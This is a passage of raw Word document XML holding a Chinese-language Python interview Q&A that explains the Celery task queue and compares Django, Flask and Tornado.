      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00D816DC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>celery</w:t>
      </w:r>
      <w:r w:rsidR="00D816DC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>讲一下</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
      <w:r w:rsidR="00D816DC" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D2D8EC" w14:textId="40FEC273" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00D816DC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>答：异步框架</w:t>
      </w:r>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD8AA1A" w14:textId="77777777" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00D816DC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>Celery介绍</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22029584" w14:textId="77777777" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00D816DC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Celery是一个功能完备即插即用的任务队列。它使得我们不需要考虑复杂的问题，使用非常简单。celery看起来似乎很庞大，先对其进行简单的了解，然后再去学习其他一些高级特性。 celery适用异步处理问题，当发送邮件、或者文件上传, 图像处理等等一些比较耗时的操作，我们可将其异步执行，这样用户不需要等待很久，提高用户体验。 celery的特点是：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582EBC46" w14:textId="406F25B2" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00DA0E72" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="00D816DC" w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>简单，易于使用和维护，有丰富的文档。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F9A2AC" w14:textId="13E9E496" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00DA0E72" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>2、</w:t>
      </w:r>
      <w:r w:rsidR="00D816DC" w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>高效，单个celery进程每分钟可以处理数百万个任务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE260C5" w14:textId="1C32092D" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00DA0E72" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00D816DC" w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>灵活，celery中几乎每个部分都可以自定义扩展。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09A75FEE" w14:textId="77777777" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00D816DC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>Celery非常易于集成到一些web开发框架中.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7517D266" w14:textId="77777777" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00D816DC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>为什么要用消息队列？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEF81F3" w14:textId="77777777" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00D816DC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>我们在做网站后端程序开发时，会碰到这样的需求：用户需要在我们的网站填写注册信息，我们发给用户一封注册激活邮件到用户邮箱，如果由于各种原因，这封邮件发送所需时间较长，那么客户端将会等待很久，造成不好的用户体验.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58591A86" w14:textId="77777777" w:rsidR="00D816DC" w:rsidRDefault="00D816DC" w:rsidP="00D816DC">
      <w:pPr>
        <w:pStyle w:val="a7"/>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76CEE890" wp14:editId="7ABCCD00">
            <wp:extent cx="7045960" cy="17189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045960" cy="1718945"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5B58F3" w14:textId="77777777" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00D816DC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>我们将耗时任务放到后台异步执行。不会影响用户其他操作。除了注册功能，例如上传，图形处理等等耗时的任务，都可以按照这种思路来解决。 如何实现异步执行任务呢？我们可使用celery. celery除了刚才所涉及到的异步执行任务之外，还可以实现定时处理某些任务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4348BF6B" w14:textId="75BBCEF0" w:rsidR="00D816DC" w:rsidRDefault="00D816DC" w:rsidP="00082DE9">
      <w:pPr>
        <w:pStyle w:val="a7"/>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38118065" wp14:editId="1277853A">
            <wp:extent cx="8775700" cy="24765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775700" cy="2476500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E44196" w14:textId="77777777" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00D816DC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>任务队列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B50FE7" w14:textId="77777777" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00D816DC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>任务队列是一种跨线程、跨机器工作的一种机制.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082FE6CA" w14:textId="77777777" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00D816DC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>任务队列中包含称作任务的工作单元。有专门的工作进程持续不断的监视任务队列，并从中获得新的任务并处理.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B58D01" w14:textId="77777777" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00D816DC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>celery通过消息进行通信，通常使用一个叫Broker(中间人)来协client(任务的发出者)和worker(任务的处理者). clients发出消息到队列中，broker将队列中的信息派发给worker来处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FEF2CFD" w14:textId="77777777" w:rsidR="00D816DC" w:rsidRPr="00D92594" w:rsidRDefault="00D816DC" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>一个celery系统可以包含很多的worker和broker，可增强横向扩展性和高可用性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32813E17" w14:textId="2D4A0668" w:rsidR="005D7785" w:rsidRDefault="00D816DC" w:rsidP="00082DE9">
      <w:pPr>
        <w:pStyle w:val="a7"/>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0E3EB014" wp14:editId="15F5B6FA">
            <wp:extent cx="8286115" cy="2409825"/>
            <wp:effectExtent l="0" t="0" r="63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86115" cy="2409825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="548734BD" w14:textId="54560490" w:rsidR="003942C2" w:rsidRPr="00652BA5" w:rsidRDefault="00D92594"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019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w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>tornado</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>框架的比较？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A04BC9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>对于django，大而全的框架它的内部组件比较多，内部提供：ORM、Admin、中间件、Form、ModelForm、Session、</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FF2A33" w14:textId="1C3FB8C6" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>缓存、信号、CSRF；功能也都挺完善的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1502C3D1" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50F057CA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>- flask，微型框架，内部组件就比较少了，但是有很多第三方组件来扩展它，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="485136F9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　比如说有那个wtform（与django的modelform类似，表单验证）、flask-sqlalchemy（操作数据库的）、</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="261EE1E0" w14:textId="2F64C7C9" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　flask-session、flask-migrate、flask-script、blinker可扩展强，第三方组件丰富。所以对他本身来说有那种短小精悍的感觉</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09CC03A7" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>- tornado，异步非阻塞。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B4D6C3" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E9FE06B" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>django和flask的共同点就是，他们2个框架都没有写socket，所以他们都是利用第三方模块wsgi。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="767119CC" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>但是内部使用的wsgi也是有些不同的：django本身运行起来使用wsgiref，而flask使用werkzeug wsgi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF79866" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="149E7379" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>还有一个区别就是他们的请求管理不太一样：django是通过将请求封装成request对象，再通过参数传递，而flask是通过上下文管理机制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DC0AA86" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035A87B0" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t># 是一个轻量级的Web框架，异步非阻塞+内置WebSocket功能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43141679" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>'目标'：通过一个线程处理N个并发请求(处理IO)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74AEE7E3" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>'内部组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7502D7B0" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    #内部自己实现socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09196E41" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    #路由系统</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA77C12" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    #视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="474F8AD1" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">  #模板</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="518D4A51" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　 #cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0386771B" w14:textId="6A40A345" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    #csrf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE85947" w14:textId="7BF3C07A" w:rsidR="003942C2" w:rsidRPr="00652BA5" w:rsidRDefault="00D92594"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020</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什么是</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
